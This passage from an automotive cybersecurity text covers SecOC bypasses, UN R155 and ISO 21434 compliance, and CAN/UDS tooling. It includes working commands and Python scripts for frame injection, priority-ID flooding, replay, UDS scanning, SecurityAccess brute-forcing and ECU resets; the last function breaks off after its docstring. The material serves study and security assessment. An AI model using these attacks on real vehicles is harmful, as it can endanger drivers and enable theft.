**Key provisioning challenges at scale.** A modern vehicle has 70–100 ECUs from 15–30 different Tier-1 suppliers. Each ECU needs the SecOC keys for the PDUs it sends and receives. The keys must be provisioned during the manufacturing process, which means the OEM's key management system must: generate unique per-vehicle keys (using the same key across all vehicles of a model means compromising one vehicle compromises all), securely distribute keys to each ECU during the assembly line (typically via a secure diagnostic connection to each ECU before the vehicle leaves the factory), and store a master copy for service scenarios (a replacement ECU must receive the vehicle's keys during a dealer service visit).

Hardware Security Modules (HSMs) in automotive MCUs (Infineon AURIX HSM, NXP SHE/SHE+, Renesas ICU-S) provide secure key storage and accelerated CMAC computation. SecOC keys are stored in the HSM's secure memory and never leave it in plaintext — the CMAC is computed inside the HSM.

### 8.6 Deployment challenges

**Legacy ECU compatibility.** Many ECUs in a vehicle predate SecOC adoption — they lack the flash space, RAM, and CPU cycles to compute CMACs for every transmitted PDU. A typical low-cost body-domain ECU (door module, window controller) uses a 16 MHz microcontroller with 64 KB flash and 8 KB RAM. AES-128-CMAC computation for a single PDU takes approximately 10-50 μs on such hardware (depending on the MCU's AES accelerator availability), and the ECU may transmit 10-20 PDUs per cycle. Without a hardware AES accelerator, the computational overhead can exceed the ECU's real-time budget. The practical consequence: OEMs deploy SecOC selectively, protecting safety-critical PDUs (brake commands, steering, engine torque) while leaving non-critical PDUs (HVAC settings, ambient lighting) unprotected. This creates a heterogeneous security environment where some bus traffic is authenticated and some is not — an attacker can still inject unauthenticated PDUs.

**Performance impact on CAN bandwidth.** On classic CAN (8-byte payload), SecOC overhead directly reduces the available signal payload. A PDU that previously carried 8 bytes of signal data now carries: N bytes of signal data + M bytes of truncated freshness value + K bytes of truncated MAC, where N + M + K ≤ 8. For a typical configuration (3 bytes MAC + 1 byte freshness value), only 4 bytes remain for signal data — a 50% payload reduction. This often requires splitting a single CAN message into two messages, doubling the bus load for that signal. On CAN FD, this problem is largely eliminated by the 64-byte payload.

**Key revocation.** If a SecOC key is compromised (e.g., extracted from a stolen ECU), the OEM must revoke it and provision a new key to every ECU in the affected vehicle. This requires a dealer visit or OTA key-update mechanism. There is no standard protocol for SecOC key revocation — each OEM implements its own procedure, typically involving a UDS-based key-update sequence protected by SecurityAccess.

### 8.7 SecOC bypass techniques

**Replay within the freshness window.** If the acceptance window is larger than necessary (e.g., ± 50 message counts), an attacker can capture a valid Secured I-PDU and replay it within the window. The MAC and freshness value will be accepted because they fall within the tolerance. Mitigation: minimize the acceptance window to the smallest value that accommodates legitimate message loss.

**MAC length exhaustion.** With short truncated MACs (24 bits), the attacker can brute-force a valid MAC for a chosen payload. The attack is online: the attacker injects frames with random MACs at maximum bus rate and waits for the receiver to accept one. The receiver's only indication of failed MAC verification is a silent drop (no error frame on the bus), so the attacker's failures are invisible. The attacker knows a brute-force succeeded when the vehicle responds to the injected command. Mitigation: use MAC lengths of at least 28 bits for safety-critical PDUs.

**Key extraction via side-channel.** If the ECU does not use an HSM (or the HSM implementation has side-channel vulnerabilities), an attacker with physical access to the ECU can extract the SecOC key via power analysis (DPA/CPA) or electromagnetic emanation analysis during CMAC computation. Mitigation: use an HSM with certified side-channel resistance (Common Criteria EAL4+ with AVA_VAN.4 or higher).

---

## 9. Regulatory framework

### 9.1 WP.29 and the regulatory context

The United Nations Economic Commission for Europe (UNECE) World Forum for Harmonization of Vehicle Regulations (WP.29) is the international body that develops vehicle safety and environmental regulations adopted by its 64 contracting parties (including the EU, Japan, South Korea, Australia — notably excluding the US, which has its own NHTSA framework, and China, which has GB standards). WP.29's Working Party on Automated/Autonomous and Connected Vehicles (GRVA) developed the cybersecurity and software-update regulations that became UN R155 and R156.

The regulations are binding for type approval: a vehicle manufacturer cannot sell a new vehicle type in an R155-contracting state without demonstrating compliance. This is the first time cybersecurity has been a legal requirement for vehicle certification — previously, cybersecurity was a voluntary best practice. The enforcement mechanism is type approval: a non-compliant vehicle cannot be registered and sold.

### 9.2 UN R155 — Cyber Security Management System

**UN Regulation No. 155** (effective July 2022 for new vehicle types, July 2024 for all new vehicles in UNECE member states): requires vehicle OEMs to implement a Cybersecurity Management System (CSMS) covering the entire vehicle lifecycle (design, production, post-production monitoring, incident response). OEMs must demonstrate: threat analysis and risk assessment for each vehicle type, implementation of mitigations for identified risks, ongoing monitoring for new threats, and incident response capability.

R155 Annex 5 enumerates 69 specific threat/vulnerability categories organized by threat vector. The categories directly relevant to this chapter:

- **Threats regarding CAN bus:** spoofing of internal messages (Annex 5, 4.3.3), unauthorized manipulation of vehicle functions via diagnostic interface (4.3.5), unauthorized injection of messages via physical bus access (4.3.6).
- **Threats regarding Ethernet:** manipulation of vehicle functions via IP-based communication (4.3.4), denial of service via network flooding (4.3.7).
- **Threats regarding update mechanisms:** corruption of data/code (4.3.1), unauthorized modification of vehicle software (4.3.2).

For type approval, the OEM submits a Certificate of Compliance from an accredited technical service (e.g., TÜV, DEKRA) that audits the CSMS and verifies that each Annex 5 threat has been assessed and mitigated or accepted with justification.

### 9.3 UN R156 — Software Update Management System

**UN Regulation No. 156**: requires a Software Update Management System (SUMS) for vehicles with software-update capability. OEMs must demonstrate: update integrity verification (signing), rollback protection, update-failure recovery, and notification of relevant parties (including type-approval authorities) when updates affect type-approval-relevant functions.

### 9.4 ISO/SAE 21434 — TARA methodology

ISO/SAE 21434 (Automotive Cybersecurity Engineering) defines a framework for cybersecurity engineering throughout the vehicle lifecycle: concept phase (cybersecurity goals, TARA — Threat Analysis and Risk Assessment), development (cybersecurity requirements, architecture, design, implementation, verification), production, operations (monitoring, incident response), and decommissioning.

The TARA methodology is the core analytical process. It proceeds in defined steps:

**Step 1: Asset identification.** Identify all assets that require cybersecurity protection. In the context of this chapter: CAN bus integrity, Automotive Ethernet communication confidentiality and integrity, ECU firmware integrity, UDS diagnostic interface access control, SecOC key confidentiality, and TSN time-synchronization accuracy.

**Step 2: Threat scenario identification.** For each asset, enumerate threat scenarios using structured methods (STRIDE, attack trees, or the ISO 21434 threat enumeration approach). Example: "An attacker with physical access to the OBD-II port injects CAN frames on the powertrain bus to send false engine-torque requests, causing unintended acceleration."

**Step 3: Impact rating.** Assess the impact of each threat scenario across four categories: Safety (S0–S3, aligned with ISO 26262 ASIL), Financial (F0–F3), Operational (O0–O3), and Privacy (P0–P3). The highest individual rating determines the overall impact level. The engine-torque injection scenario: Safety = S3 (life-threatening, potential fatal accident), Financial = F2 (vehicle recall), Operational = O3 (vehicle immobilized), Privacy = P0 (no privacy impact). Overall impact: S3 (the maximum).

**Step 4: Attack feasibility rating.** Assess how feasible the attack is, considering: elapsed time (how long the attack takes), specialist expertise required, knowledge of the target (publicly available vs. restricted), window of opportunity (unlimited physical access vs. brief proximity), and equipment required (standard vs. bespoke). ISO 21434 maps these parameters to an overall feasibility rating: High, Medium, Low, or Very Low. The CAN injection via OBD-II: elapsed time = minutes (Low), expertise = proficient (automotive security knowledge), knowledge = publicly available (CAN injection tools are open-source), window = physical access to OBD-II (requires vehicle proximity), equipment = standard (< €500 CAN interface). Overall feasibility: High.

**Step 5: Risk determination.** Combine impact and feasibility into a risk level (using a matrix defined by the OEM's risk acceptance criteria). An S3-impact / High-feasibility threat is typically rated as unacceptable risk — requiring mitigation.

**Step 6: Risk treatment.** Select a treatment strategy: mitigate (implement SecOC on powertrain CAN, add CAN IDS), transfer (insurance), accept (only for low-risk items with documented justification), or avoid (remove the attack surface — e.g., disconnect OBD-II from powertrain CAN via gateway filtering). Each selected mitigation becomes a cybersecurity requirement that flows into the development phase.

**Attack path analysis.** For complex threats that require multiple steps (e.g., compromising the infotainment system via cellular, then pivoting to the powertrain CAN via the gateway), ISO 21434 recommends attack-path analysis using attack trees. Each path from the root threat to the leaf prerequisites is scored independently, and the overall feasibility is determined by the most feasible path. This is important because a threat may have one infeasible direct path (e.g., direct physical access to the powertrain CAN, which is buried in the engine compartment) but a feasible indirect path (e.g., remote cellular access → infotainment compromise → gateway bypass → powertrain CAN injection). The TARA must identify and score all paths, not just the most obvious one.

**Cybersecurity goals and claims.** The output of the TARA is a set of cybersecurity goals (e.g., "CAN injection on the powertrain bus shall be detected within 100 ms and the injected frames shall not affect safety-critical actuators") and cybersecurity claims (e.g., "SecOC with 28-bit MAC on all safety-critical powertrain PDUs, combined with specification-based CAN IDS, reduces the feasibility of CAN injection from High to Very Low"). These goals and claims are the contractual interface between the OEM and its Tier-1 suppliers: each ECU supplier must demonstrate that their implementation satisfies the cybersecurity goals allocated to their component.

ISO 21434 does not prescribe specific mitigations — it defines a process for identifying and managing cybersecurity risks. It is the cybersecurity companion to ISO 26262 (Functional Safety), and both are required for UN R155 compliance.

### 9.5 Compliance mapping: attacks to regulatory requirements

The following maps the attacks described in this chapter to their regulatory treatment:

**CAN injection (§4.3) and priority DoS (§4.4):** R155 Annex 5, 4.3.3/4.3.6. Required mitigations under ISO 21434 TARA: SecOC authentication for safety-critical PDUs, CAN IDS (specification-based and anomaly-based), gateway filtering to limit cross-domain injection. Evidence for type approval: TARA document showing the threat was assessed, mitigation design documents, verification test results demonstrating injection detection.

**Bus-off attack (§4.5):** R155 Annex 5, 4.3.6. Required mitigations: ECU error-counter monitoring (detect anomalous TEC increments), bus guardian hardware (a secondary controller that monitors bus activity and can electrically disconnect a misbehaving node). Evidence: hardware test reports showing bus-off detection and recovery.

**UDS exploitation (§7.3–7.5):** R155 Annex 5, 4.3.5. Required mitigations: strong SecurityAccess algorithms (minimum 128-bit key space, NIST-approved derivation), attempt-limiting (NRC 0x36 after 3 failed attempts, NRC 0x37 with minimum 10-second delay), ISO 14229-1:2020 Authentication service (0x29) for PKI-based mutual authentication replacing legacy seed-key. Evidence: algorithm security analysis, penetration test results.

**DoIP unauthenticated access (§6.3):** R155 Annex 5, 4.3.4/4.3.5. Required mitigations: TLS for DoIP (ISO 13400-3), network segmentation preventing telematics-to-diagnostic bridging. Evidence: network architecture review, TLS certificate management documentation.

**SOME/IP-SD spoofing (§6.4):** R155 Annex 5, 4.3.4. Required mitigations: TLS/DTLS for SOME/IP, PSFP (802.1Qci) per-stream filtering, IAM (AUTOSAR Adaptive). Evidence: penetration test demonstrating that unauthenticated service calls are rejected.

**TSN time-synchronization attack (§6.3):** R155 Annex 5, 4.3.7. Required mitigations: authenticated gPTP (IEEE 802.1AS-2020 Annex), redundant grandmaster clocks, time-error detection at application level. Evidence: TSN configuration review, fault-injection test results.

**SecOC bypass via MAC brute-force (§8.7):** R155 Annex 5, 4.3.3. Required mitigations: minimum 28-bit MAC for safety-critical PDUs, IDS monitoring for anomalous MAC-verification failure rates. A brute-force attempt generates millions of failed verifications before a single success — the IDS can detect this as a sustained spike in MAC-failure counters per PDU, which is a strong indicator distinguishing brute-force from legitimate noise-induced corruption.
Evidence for type approval: SecOC configuration documentation showing MAC lengths per PDU criticality level, IDS rule demonstrating brute-force detection with measured false-positive rate.

**LIN/FlexRay injection (§10):** R155 Annex 5, 4.3.6 (generic internal communication). Required mitigations: gateway filtering preventing CAN-to-LIN message forwarding for unauthorized IDs, physical access hardening (LIN connectors not externally accessible). Evidence: wiring harness design review, gateway filter configuration.

---

## 10. LIN and FlexRay — brief security notes

**LIN (Local Interconnect Network).** LIN is a low-cost, low-speed (19.2 kbps) single-wire serial bus used for non-critical body functions: seat adjustment, mirror control, rain sensors, ambient lighting. LIN uses a master-slave architecture: one master node (typically the body controller) polls each slave node in a fixed schedule. LIN has no authentication, no encryption, and no error confinement beyond a simple checksum. An attacker with physical access to the LIN bus (accessible via the body wiring harness or connector behind the dashboard) can inject frames to control any slave function. The security risk is generally low (LIN-controlled functions have minimal safety impact), but LIN is sometimes used as a lateral-movement path: a compromised body controller that masters a LIN bus can manipulate LIN slaves without triggering CAN IDS rules, because the CAN IDS monitors the CAN bus, not the LIN bus downstream of the body controller.

**FlexRay.** FlexRay (ISO 17458) is a high-speed (10 Mbps), deterministic, time-triggered bus used in some premium vehicles for safety-critical applications (steer-by-wire, active suspension). FlexRay uses TDMA (Time Division Multiple Access) scheduling: each ECU transmits in a pre-assigned time slot, eliminating bus contention. FlexRay provides redundancy via dual-channel operation (two independent buses). FlexRay has no built-in authentication — the TDMA schedule provides implicit sender identification (only the authorized ECU should transmit in a given slot), but an attacker who can transmit during another ECU's slot can inject frames. FlexRay's adoption peaked around 2010-2015 (BMW 5/7 series, some Mercedes and Audi models used FlexRay for chassis control); it is being replaced by Automotive Ethernet with TSN in newer architectures. Security research on FlexRay is limited compared to CAN, but the attack model is analogous: physical bus access → frame injection → actuator manipulation. The TDMA schedule does provide one defense property that CAN lacks: a frame transmitted outside its assigned time slot is trivially detectable by any node monitoring the schedule, making stealthy injection harder than on CAN. However, an attacker who can precisely time their injections to fall within the target slot (and suppress the legitimate ECU's transmission via jamming or bus-off-equivalent techniques) can bypass this detection.

LIN and FlexRay are both covered by ISO/SAE 21434's scope: the TARA process must assess threats to all in-vehicle communication buses, not just CAN and Ethernet. UN R155 Annex 5 similarly references "internal communication" generically, encompassing CAN, Ethernet, LIN, FlexRay, and any other bus technology deployed in the vehicle.

---

## 11A. CAN Bus Exploitation Tools

### 11A.1 can-utils (Linux SocketCAN)

The `can-utils` package is the standard command-line toolkit for CAN bus interaction on Linux. It requires a SocketCAN-compatible interface (physical or virtual).

**Interface setup (SocketCAN).**

```bash
# Load the CAN kernel modules
sudo modprobe can
sudo modprobe can_raw
sudo modprobe vcan        # virtual CAN for lab testing

# Create a virtual CAN interface (no hardware needed)
sudo ip link add dev vcan0 type vcan
sudo ip link set up vcan0

# Configure a physical CAN interface (e.g., CANtact, PCAN-USB, Kvaser Leaf)
sudo ip link set can0 type can bitrate 500000
sudo ip link set up can0

# CAN FD interface with dual bit-rate
sudo ip link set can0 type can bitrate 500000 dbitrate 2000000 fd on
sudo ip link set up can0

# Verify interface is up
ip -details link show can0
```

**candump — traffic capture.**

```bash
# Dump all traffic with absolute timestamps
candump -t A can0

# Dump with log format (replayable with canplayer)
candump -l can0
# Output: candump-2026-05-09_143022.log

# Filter: only IDs 0x100-0x1FF on can0
candump can0,100:700

# Filter: single ID 0x7DF (OBD-II functional broadcast)
candump can0,7DF:7FF

# Multi-interface capture (CAN + CAN FD)
candump can0 can1

# Dump with error frames visible
candump -e can0
```

**cansend — single frame injection.**

```bash
# Standard OBD-II Mode 01 PID 05 request (engine coolant temperature)
cansend can0 7DF#0201050000000000

# Inject a crafted powertrain message (ID 0x188, 8 bytes)
cansend can0 188#DEADBEEF00000000

# CAN FD frame with BRS flag (## delimiter for FD, flags byte at end)
cansend can0 188##1.DEADBEEFCAFEBABE0011223344556677
# 1 = BRS flag enabled
```

**cangen — traffic generation and fuzzing.**

```bash
# Random IDs, random data, random DLC, 10 ms interval
cangen can0 -g 10 -I r -D r -L r

# Fixed ID, random data (targeted ECU fuzzing)
cangen can0 -g 5 -I 0x7DF -D r -L 8

# Incrementing data (walking-byte pattern for signal correlation)
cangen can0 -g 10 -I 0x188 -D i -L 8

# Maximum rate flood on ID 0x000 (priority DoS)
cangen can0 -g 0 -I 0x000 -D 0000000000000000 -L 8
```

**canplayer — traffic replay.**

```bash
# Replay a captured log file on can0
canplayer -I candump-2026-05-09_143022.log

# Replay with interface mapping (log was on vcan0, replay on can0)
canplayer -I logfile.log can0=vcan0

# Replay in a loop (continuous replay for sustained injection)
canplayer -l i -I logfile.log can0=vcan0

# Replay with timing gap adjustment (2x speed)
canplayer -I logfile.log -g 0.5
```

**cansniffer — live differential analysis.**

```bash
# Show only changing bytes, color-coded
cansniffer -c can0

# Filter to specific IDs
cansniffer -c can0 -f 100-1FF

# Binary mode (show individual bit changes)
cansniffer -c -b can0
```

**canbusload — bus utilization monitoring.**

```bash
# Monitor bus load (requires knowing the bitrate)
canbusload can0@500000

# Detect DoS: normal load is 30-60%, sustained >85% indicates flooding
```

**isotpsend / isotprecv — ISO-TP (multi-frame UDS).**

```bash
# Send UDS ReadDataByIdentifier for VIN (DID 0xF190)
echo "22 F1 90" | isotpsend -s 0x7E0 -d 0x7E8 can0

# Receive the multi-frame response
isotprecv -s 0x7E8 -d 0x7E0 can0

# Send DiagnosticSessionControl to enter extended session
echo "10 03" | isotpsend -s 0x7E0 -d 0x7E8 can0

# SecurityAccess seed request (level 0x01)
echo "27 01" | isotpsend -s 0x7E0 -d 0x7E8 can0
```

### 11A.2 python-can — comprehensive CAN toolkit

A complete CAN sniffing, filtering, injection, and UDS scanning script:

```python
#!/usr/bin/env python3
"""CAN bus reconnaissance and injection toolkit.

Requires: pip install python-can cantools python-udsoncan
Hardware: any SocketCAN-compatible adapter (CANtact, PCAN-USB, Kvaser)
"""

import can
import cantools
import time
import struct
import argparse
from collections import defaultdict
from typing import Optional


class CANRecon:
    """CAN bus reconnaissance: sniff, filter, decode, inject."""

    def __init__(self, channel: str = 'can0', bustype: str = 'socketcan',
                 bitrate: int = 500000, dbc_path: Optional[str] = None):
        self.bus = can.interface.Bus(
            channel=channel, bustype=bustype, bitrate=bitrate
        )
        self.db = None
        if dbc_path:
            self.db = cantools.database.load_file(dbc_path)
        self.baseline: dict[int, dict] = {}
        self.id_frequency: dict[int, list[float]] = defaultdict(list)

    def sniff(self, duration: float = 10.0, id_filter: Optional[set[int]] = None):
        """Capture CAN traffic for a given duration.

        Args:
            duration: capture duration in seconds.
            id_filter: if set, only capture frames with these arbitration IDs.

        Returns:
            list of captured can.Message objects.
        """
        captured = []
        deadline = time.monotonic() + duration
        while time.monotonic() < deadline:
            msg = self.bus.recv(timeout=0.1)
            if msg is None:
                continue
            if id_filter and msg.arbitration_id not in id_filter:
                continue
            captured.append(msg)
            self.id_frequency[msg.arbitration_id].append(msg.timestamp)
        return captured

    def build_baseline(self, messages: list[can.Message]):
        """Build a baseline of normal CAN traffic for anomaly detection.

        Computes per-ID: message count, mean period, data range per byte.
        """
        id_msgs: dict[int, list[can.Message]] = defaultdict(list)
        for msg in messages:
            id_msgs[msg.arbitration_id].append(msg)

        for arb_id, msgs in id_msgs.items():
            timestamps = [m.timestamp for m in msgs]
            periods = [timestamps[i+1] - timestamps[i]
                       for i in range(len(timestamps) - 1)]
            mean_period = sum(periods) / len(periods) if periods else 0.0

            byte_ranges = []
            for byte_idx in range(8):
                values = [m.data[byte_idx] for m in msgs if len(m.data) > byte_idx]
                if values:
                    byte_ranges.append((min(values), max(values)))
                else:
                    byte_ranges.append((0, 0))

            self.baseline[arb_id] = {
                'count': len(msgs),
                'mean_period_ms': mean_period * 1000,
                'byte_ranges': byte_ranges,
                'dlc': msgs[0].dlc,
            }

        return self.baseline

    def detect_anomalies(self, messages: list[can.Message]) -> list[dict]:
        """Detect anomalous frames relative to baseline.

        Checks: unknown IDs, frequency deviation, out-of-range data values.
        """
        alerts = []
        id_timestamps: dict[int, list[float]] = defaultdict(list)

        for msg in messages:
            aid = msg.arbitration_id
            id_timestamps[aid].append(msg.timestamp)

            if aid not in self.baseline:
                alerts.append({
                    'type': 'UNKNOWN_ID',
                    'id': f'0x{aid:03X}',
                    'timestamp': msg.timestamp,
                    'severity': 'HIGH',
                })
                continue

            bl = self.baseline[aid]
            for byte_idx in range(min(len(msg.data), 8)):
                lo, hi = bl['byte_ranges'][byte_idx]
                if msg.data[byte_idx] < lo or msg.data[byte_idx] > hi:
                    alerts.append({
                        'type': 'OUT_OF_RANGE',
                        'id': f'0x{aid:03X}',
                        'byte': byte_idx,
                        'value': msg.data[byte_idx],
                        'expected': f'{lo}-{hi}',
                        'timestamp': msg.timestamp,
                        'severity': 'MEDIUM',
                    })

        # Frequency anomaly detection
        for aid, ts_list in id_timestamps.items():
            if aid not in self.baseline or len(ts_list) < 3:
                continue
            periods = [ts_list[i+1] - ts_list[i]
                       for i in range(len(ts_list) - 1)]
            observed_mean = (sum(periods) / len(periods)) * 1000
            expected = self.baseline[aid]['mean_period_ms']
            if expected > 0 and observed_mean < expected * 0.5:
                alerts.append({
                    'type': 'HIGH_FREQUENCY',
                    'id': f'0x{aid:03X}',
                    'observed_period_ms': round(observed_mean, 2),
                    'expected_period_ms': round(expected, 2),
                    'severity': 'HIGH',
                })

        return alerts

    def decode_with_dbc(self, messages: list[can.Message]) -> list[dict]:
        """Decode CAN messages using a loaded DBC file."""
        if not self.db:
            raise ValueError("No DBC file loaded")
        decoded = []
        for msg in messages:
            try:
                signals = self.db.decode_message(msg.arbitration_id, msg.data)
                decoded.append({
                    'id': f'0x{msg.arbitration_id:03X}',
                    'name': self.db.get_message_by_frame_id(
                        msg.arbitration_id
                    ).name,
                    'signals': signals,
                    'timestamp': msg.timestamp,
                })
            except KeyError:
                pass  # ID not in DBC
        return decoded

    def inject(self, arb_id: int, data: bytes, count: int = 1,
               interval: float = 0.01):
        """Inject CAN frames.

        Args:
            arb_id: arbitration ID.
            data: payload bytes (up to 8).
            count: number of frames to send.
            interval: inter-frame delay in seconds.
        """
        msg = can.Message(
            arbitration_id=arb_id, data=data, is_extended_id=False
        )
        for _ in range(count):
            self.bus.send(msg)
            if count > 1:
                time.sleep(interval)

    def scan_uds_responders(self, id_range: tuple[int, int] = (0x600, 0x7FF),
                            timeout: float = 0.5) -> list[dict]:
        """Scan for ECUs that respond to UDS DiagnosticSessionControl.

        Sends SID 0x10 (DiagnosticSessionControl) subfunction 0x01
        (defaultSession) to each arbitration ID in range and listens
        for positive or negative responses.
        """
        responders = []
        for tx_id in range(id_range[0], id_range[1] + 1):
            # Standard UDS request/response ID convention:
            # request on tx_id, response on tx_id + 0x08
            rx_id = tx_id + 0x08
            request = can.Message(
                arbitration_id=tx_id,
                data=bytes([0x02, 0x10, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00]),
                is_extended_id=False,
            )
            self.bus.send(request)
            deadline = time.monotonic() + timeout
            while time.monotonic() < deadline:
                resp = self.bus.recv(timeout=0.1)
                if resp is None:
                    continue
                if resp.arbitration_id == rx_id:
                    sid_resp = resp.data[1] if len(resp.data) > 1 else 0
                    if sid_resp == 0x50:  # Positive response to 0x10
                        responders.append({
                            'tx_id': f'0x{tx_id:03X}',
                            'rx_id': f'0x{rx_id:03X}',
                            'response': 'positive',
                        })
                    elif sid_resp == 0x7F:  # Negative response
                        nrc = resp.data[3] if len(resp.data) > 3 else 0
                        responders.append({
                            'tx_id': f'0x{tx_id:03X}',
                            'rx_id': f'0x{rx_id:03X}',
                            'response': 'negative',
                            'nrc': f'0x{nrc:02X}',
                        })
                    break

        return responders

    def close(self):
        self.bus.shutdown()
```

### 11A.3 SavvyCAN

SavvyCAN is a Qt-based GUI tool for CAN bus analysis, reverse engineering, and scripting.

**Core capabilities.** DBC loading and real-time signal decoding with graphical signal plotting over time. Frame filtering by ID, data pattern, or periodicity. Built-in scripting engine (JavaScript) for automated RE workflows: capture → filter → decode → export CSV. Supports multiple simultaneous CAN interfaces. Flow view for visualizing message timing and inter-arrival times. Fuzzing panel for targeted ID/data permutation with configurable rates.

**DBC workflow.** Load a DBC file via `File → Load DBC`. SavvyCAN automatically decodes all matching arbitration IDs in the capture. The signal graph panel (`View → Signal Graph`) plots decoded physical values over time — the primary tool for visual correlation during reverse engineering. When performing manual RE without a DBC, use the `Sniffer View` to observe byte-level changes while actuating vehicle controls.

**Scripting interface.** SavvyCAN exposes a JavaScript API for automation:

```javascript
// SavvyCAN script: extract all unique IDs and their byte ranges
var ids = {};
var frames = can.getFrames();
for (var i = 0; i < frames.length; i++) {
    var f = frames[i];
    var id = f.id.toString(16).toUpperCase();
    if (!(id in ids)) {
        ids[id] = { count: 0, minBytes: new Array(8).fill(255),
                     maxBytes: new Array(8).fill(0) };
    }
    ids[id].count++;
    for (var b = 0; b < f.len; b++) {
        if (f.data[b] < ids[id].minBytes[b]) ids[id].minBytes[b] = f.data[b];
        if (f.data[b] > ids[id].maxBytes[b]) ids[id].maxBytes[b] = f.data[b];
    }
}
for (var id in ids) {
    host.log("ID 0x" + id + " count=" + ids[id].count +
             " ranges=" + JSON.stringify(ids[id].minBytes) +
             "-" + JSON.stringify(ids[id].maxBytes));
}
```

### 11A.4 Hardware setup — CANtact, PCAN, Kvaser

**CANtact / CANable (open-source, SocketCAN-native).** USB-to-CAN adapter based on STM32 with candleLight firmware. Plug-and-play on Linux — appears as a SocketCAN `can0` interface. No proprietary drivers. Cost: $30-60. Best for: Linux-based CAN research, integration with python-can and can-utils. Limitation: single-channel, standard CAN only (no CAN FD on original CANtact; CANable 2.0 supports CAN FD).

```bash
# CANtact/CANable shows up as gs_usb device
sudo ip link set can0 type can bitrate 500000
sudo ip link set up can0
# Verify
candump can0
```

**PCAN-USB (Peak Systems).** Industrial-grade USB-to-CAN adapter. Linux support via `peak_usb` kernel module (SocketCAN-compatible). PCAN-USB FD variant supports CAN FD. Cost: $200-350. Professional build quality and EMC tolerance.

```bash
# PCAN-USB — kernel module loads automatically
# Appears as peak_usb device -> can0
sudo ip link set can0 type can bitrate 500000
sudo ip link set up can0
# CAN FD mode
sudo ip link set can0 type can bitrate 500000 dbitrate 2000000 fd on
sudo ip link set up can0
```

**Kvaser Leaf Light v2.** Professional-grade adapter with Kvaser's CANlib SDK (Windows) and SocketCAN support (Linux, via `kvaser_usb` module). Supports CAN FD on Leaf Pro models. Cost: $300-500. Best for: cross-platform work, integration with Vector tools.

```bash
# Kvaser — appears via kvaser_usb module
sudo modprobe kvaser_usb
sudo ip link set can0 type can bitrate 500000
sudo ip link set up can0
```

**Dual-interface setup (sniff + inject simultaneously).**

```bash
# Adapter 1: passive sniffing (candump)
sudo ip link set can0 type can bitrate 500000
sudo ip link set up can0
candump -l can0 &

# Adapter 2: active injection (cansend)
sudo ip link set can1 type can bitrate 500000
sudo ip link set up can1
cansend can1 7DF#0201050000000000
```

### 11A.5 isotp-c / python-udsoncan

**isotp-c.** A C library implementing ISO 15765-2 (ISO-TP) for embedded systems and testing. Handles segmentation, flow control, and reassembly. Used for building custom UDS tools that operate below the python-udsoncan abstraction layer — useful when testing ISO-TP-level vulnerabilities (buffer overflow via oversized First Frame, flow-control stalling).

**python-udsoncan.** The primary Python library for UDS exploitation. Abstracts ISO-TP transport, UDS service encoding/decoding, and NRC handling. Used extensively in §11B for complete exploitation scripts.

### 11A.6 caringcaribou — automotive security testing framework

caringcaribou is a modular Python framework purpose-built for automotive security assessments. It automates the common diagnostic attack workflows.

```bash
# ECU discovery — scan for UDS responders on all standard IDs
python -m caringcaribou uds discovery

# Service enumeration — list supported UDS services on a target ECU
python -m caringcaribou uds services 0x7E0 0x7E8

# SecurityAccess brute-force — iterate key candidates
python -m caringcaribou uds security_access 0x7E0 0x7E8

# ECUReset — trigger ECU reset (DoS vector)
python -m caringcaribou uds ecu_reset 0x7E0 0x7E8

# DID scanning — enumerate readable Data Identifiers
python -m caringcaribou uds dump_dids 0x7E0 0x7E8

# XCP discovery — scan for XCP (calibration protocol) endpoints
python -m caringcaribou xcp discovery

# Fuzz a specific UDS service (e.g., SecurityAccess 0x27)
python -m caringcaribou uds fuzz 0x7E0 0x7E8 0x27

# Custom module: scan for undocumented manufacturer-specific services
# (SID range 0xA0-0xFE is reserved for manufacturer use)
python -m caringcaribou uds services 0x7E0 0x7E8 --min 0xA0 --max 0xFE
```

caringcaribou's modular architecture (`caringcaribou/modules/`) allows adding custom modules for OEM-specific protocols, proprietary diagnostic sequences, and automated attack chains. The `listener` module provides passive traffic monitoring with rule-based alerting.

---

## 11B. UDS Exploitation Scripts

### 11B.1 DiagnosticSessionControl and session management

UDS exploitation begins with session escalation. The default session (0x01) restricts access to read-only services. The extended diagnostic session (0x03) enables data read/write, routine control, and SecurityAccess. The programming session (0x02) enables firmware download/upload.

```python
#!/usr/bin/env python3
"""UDS session management and SecurityAccess exploitation.

Requires: pip install udsoncan python-can
"""

import udsoncan
from udsoncan.connections import IsoTPSocketConnection
from udsoncan.client import Client
from udsoncan import services, configs, MemoryLocation
from udsoncan.exceptions import NegativeResponseException
import time
import struct
import hashlib


def create_uds_client(channel: str = 'can0',
                      tx_id: int = 0x7E0,
                      rx_id: int = 0x7E8) -> tuple:
    """Create a UDS client with ISO-TP connection."""
    config = configs.default_client_config.copy()
    config['data_identifiers'] = {
        0xF190: udsoncan.AsciiCodec(17),   # VIN
        0xF187: udsoncan.AsciiCodec(20),   # Supplier ECU HW version
        0xF189: udsoncan.AsciiCodec(20),   # Supplier ECU SW version
        0xF191: udsoncan.AsciiCodec(20),   # System supplier ECU HW number
    }
    conn = IsoTPSocketConnection(channel, rxid=rx_id, txid=tx_id)
    return conn, config


def enumerate_sessions(channel: str = 'can0',
                       tx_id: int = 0x7E0,
                       rx_id: int = 0x7E8) -> dict:
    """Enumerate which diagnostic sessions the ECU supports."""
    conn, config = create_uds_client(channel, tx_id, rx_id)
    results = {}
    with Client(conn, config=config) as client:
        for session_type in range(0x01, 0x80):
            try:
                client.change_session(session_type)
                results[f'0x{session_type:02X}'] = 'supported'
                # Return to default session before trying next
                client.change_session(0x01)
            except NegativeResponseException as e:
                if e.response.code == 0x12:  # subFunctionNotSupported
                    continue  # Session type does not exist
                results[f'0x{session_type:02X}'] = f'NRC 0x{e.response.code:02X}'
                try:
                    client.change_session(0x01)
                except Exception:
                    pass
            except Exception:
                pass
    return results
```

### 11B.2 SecurityAccess — seed-key brute-force

```python
def bruteforce_security_access(channel: str = 'can0',
                                tx_id: int = 0x7E0,
                                rx_id: int = 0x7E8,
                                security_level: int = 0x01,
                                key_length: int = 2,
                                max_attempts: int = 0x10000,
                                lockout_delay: float = 11.0) -> bytes | None:
    """Brute-force a UDS SecurityAccess level.

    Works when the key space is small (16-bit or smaller) and the
    seed-key algorithm is unknown.

    Args:
        security_level: odd number (0x01, 0x03, 0x05, ...) for seed request.
        key_length: length of key in bytes.
        max_attempts: upper bound on key space.
        lockout_delay: seconds to wait after NRC 0x36/0x37.

    Returns:
        The valid key bytes, or None if not found.
    """
